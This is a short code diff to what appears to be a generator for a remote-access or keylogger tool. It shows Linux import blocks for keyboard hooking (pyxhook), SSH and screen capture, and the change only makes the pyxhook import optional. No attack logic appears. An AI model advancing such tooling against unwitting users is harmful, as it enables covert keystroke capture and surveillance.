@@ -446,7 +446,10 @@ from AppKit import NSApplication, NSApp, NSWorkspace\n\n
 def lnx_util_imports():
     return '''
 import pexpect
-import pyxhook
+try:
+    import pyxhook
+except ImportError:
+    pyxhook = None
 import pexpect.pxssh
 from mss.linux import MSS
 from st_lnx_keylogger import *\n
@@ -822,7 +825,10 @@ def get_lnx_keylogger():
 import os
 import sys
 import time
-import pyxhook
+try:
+    import pyxhook
+except ImportError:
+    pyxhook = None
 import datetime
 import threading
 
